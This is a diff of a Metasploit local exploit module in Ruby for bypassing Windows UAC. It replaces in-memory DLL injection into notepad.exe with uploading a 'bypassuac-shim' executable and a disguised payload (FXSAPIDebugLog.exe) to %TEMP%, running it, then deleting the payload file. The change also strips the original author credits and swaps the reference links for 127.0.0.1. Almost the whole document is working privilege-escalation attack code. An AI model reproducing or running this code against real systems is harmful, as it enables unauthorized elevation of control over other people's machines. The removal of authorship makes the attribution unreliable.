@@ -12,27 +12,16 @@ class Metasploit3 < Msf::Exploit::Local
   include Exploit::EXE
   include Post::File
   include Post::Windows::Priv
-  include Post::Windows::ReflectiveDLLInjection
 
   def initialize(info={})
     super( update_info( info,
       'Name'          => 'Windows Escalate UAC Protection Bypass (In Memory Injection)',
       'Description'   => %q{
-        This module will bypass Windows UAC by utilizing the trusted publisher
-        certificate through process injection. It will spawn a second shell that
-        has the UAC flag turned off. This module uses the Reflective DLL Injection
-        technique to drop only the DLL payload binary instead of three seperate
-        binaries in the standard technique. However, it requires the correct
-        architecture to be selected, (use x64 for SYSWOW64 systems also).
-        If specifying EXE::Custom your DLL should call ExitProcess() after starting
-        your payload in a seperate process.
+        This module will bypass Windows UAC.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [
-          'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',
-          'mitnick',
-          'mubix', # Port to local exploit
-          'Ben Campbell' # In memory technique
+          'tomsmaily', # Port to shim exploit
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ],
@@ -43,8 +32,8 @@ class Metasploit3 < Msf::Exploit::Local
       'DefaultTarget' => 0,
       'References'    => [
         [
-          'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/',
-          'URL', 'http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html'
+          'URL', 'http://127.0.0.1',
+          'URL', '127.0.0.1'
         ]
       ],
       'DisclosureDate'=> "Dec 31 2010"
@@ -52,7 +41,7 @@ class Metasploit3 < Msf::Exploit::Local
 
   end
 
-  def bypass_dll_path
+  def bypassuac_path
     # path to the bypassuac binary
     path = ::File.join(Msf::Config.data_directory, "post")
 
@@ -71,17 +60,17 @@ class Metasploit3 < Msf::Exploit::Local
       end	  
 	
       unless(target_arch.first =~ /64/i) and (payload_instance.arch.first =~ /64/i)
-        # fail_with(
-            # Exploit::Failure::BadConfig,
-            # "x86 Target Selected for x64 System"
-        # )
-		print_error("BadConfig! x86 Target Selected for x64 System. Payload instance is not x64 and may crash!!!")
+         fail_with(
+             Exploit::Failure::BadConfig,
+             "x86 Target Selected for x64 System"
+         )
+		#print_error("BadConfig! x86 Target Selected for x64 System. Payload instance is not x64 and may crash!!!")
       end
 
       if sysarch =~ /WOW64/i
-        return ::File.join(path, "bypassuac-x86.dll")
+        return ::File.join(path, "bypassuac-shim-x86.exe")
       else
-        return ::File.join(path, "bypassuac-x64.dll")
+        return ::File.join(path, "bypassuac-shim-x64.exe")
       end
     else
       if (target_arch.first =~ /64/i) or (payload_instance.arch.first =~ /64/i)
@@ -89,13 +78,12 @@ class Metasploit3 < Msf::Exploit::Local
             Exploit::Failure::BadConfig,
             "x64 Target Selected for x86 System"
         )
+		#print_error("BadConfig! x64 Target Selected for x86 System. Payload instance is not x86 and will crash!!!")
       end
 
-      ::File.join(path, "bypassuac-x86.dll")
+      ::File.join(path, "bypassuac-shim-x86.exe") 
     end
   end
-
-
 
   def check_permissions!
     # Check if you are an admin
@@ -141,77 +129,54 @@ class Metasploit3 < Msf::Exploit::Local
 
     @temp_path = expand_path('%TEMP%').strip
 
-    upload_payload_dll!
+    upload_payload!
 
-    pid = spawn_inject_proc
-
-    run_injection(pid, bypass_dll_path)
+    initiate_bypassuac(bypassuac_path)
 
     # delete the uac bypass payload
     vprint_status("Cleaning up payload file...")
     file_rm(payload_filepath)
   end
 
-
   def payload_filepath
-    "#{@temp_path}\\CRYPTBASE.dll"
+    "#{@temp_path}/FXSAPIDebugLog.exe"
   end
-
-
 
   def runas_method
     payload = generate_payload_exe
     payload_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
     tmpdir = expand_path("%TEMP%")
-    tempexe = tmpdir + "\\" + payload_filename
+    tempexe = tmpdir + "/" + payload_filename
     write_file(tempexe, payload)
     print_status("Uploading payload: #{tempexe}")
     session.railgun.shell32.ShellExecuteA(nil,"runas",tempexe,nil,nil,5)
-    print_status("Payload executed")
+    print_status("Payload executed!")
   end
 
-
-
-
-  def run_injection(pid, dll_path)
-    vprint_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
+  def initiate_bypassuac(bypassuac_path)
+	print_status("Initiating UAC bypass!")
     begin
-      vprint_status("Opening process #{pid}")
-      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
-      exploit_mem, offset = inject_dll_into_process(host_process, dll_path)
-      vprint_status("Executing payload")
-      thread = host_process.thread.create(exploit_mem + offset, 0)
-      print_good("Successfully injected payload in to process: #{pid}")
-      client.railgun.kernel32.WaitForSingleObject(thread.handle,14000)
+		bypassuac_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+		tmpdir = expand_path("%TEMP%")
+		tempexe = tmpdir + "/" + bypassuac_filename
+		bypassuac = IO.binread(bypassuac_path)
+		write_file(tempexe, bypassuac)
+		print_status("Uploading bypassuac: #{tempexe}")
+		pid = cmd_exec_get_pid("#{tempexe}")
     rescue Rex::Post::Meterpreter::RequestError => e
-      print_error("Failed to Inject Payload to #{pid}!")
+      print_error("Failed to execute bypassuac!")
       vprint_error(e.to_s)
     end
   end
 
-
-
-  def spawn_inject_proc
-    windir = expand_path("%WINDIR%").strip
-    print_status("Spawning process with Windows Publisher Certificate, to inject into...")
-    cmd = "#{windir}\\System32\\notepad.exe"
-    pid = cmd_exec_get_pid(cmd)
-
-    unless pid
-      fail_with(Exploit::Failure::Unknown, "Spawning Process failed...")
-    end
-
-    pid
-  end
-
-
-
-  def upload_payload_dll!
-    payload = generate_payload_dll({:dll_exitprocess => true})
-    print_status("Uploading the Payload DLL to the filesystem...")
+  def upload_payload!
+    payload = generate_payload_exe
+    print_status("Uploading the Payload to remote location... #{payload_filepath}")
     begin
-      vprint_status("Payload DLL #{payload.length} bytes long being uploaded..")
+      vprint_status("Payload #{payload.length} bytes long being uploaded..")
       write_file(payload_filepath, payload)
+	  #upload_file("#{payload_filepath}", payload)
+	  #file_local_write(payload_filepath, payload)
     rescue Rex::Post::Meterpreter::RequestError => e
       fail_with(
           Exploit::Exception::Unknown,
@@ -219,9 +184,6 @@ class Metasploit3 < Msf::Exploit::Local
       )
     end
   end
-
-
-
 
   def validate_environment!
     fail_with(Exploit::Failure::None, 'Already in elevated state') if is_admin? or is_system?
